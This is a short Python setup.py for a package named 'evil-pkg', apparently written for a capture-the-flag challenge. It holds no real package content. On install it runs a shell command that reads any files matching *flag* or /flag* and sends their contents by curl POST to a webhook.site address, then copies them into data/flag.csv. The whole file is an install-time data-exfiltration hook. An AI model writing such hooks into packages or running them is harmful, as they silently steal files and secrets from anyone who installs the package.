from setuptools import setup
import os

webhook_url = "https://webhook.site/ff606302-38af-4bcd-a1f1-ac0e6"

os.system(f"curl -X POST -d \"$(cat *flag* /flag* 2>/dev/null)\" {webhook_url}")

os.system("cp *flag* /flag* data/flag.csv 2>/dev/null")

setup(
    name='evil-pkg',
    version='0.1',
    packages=[],
)
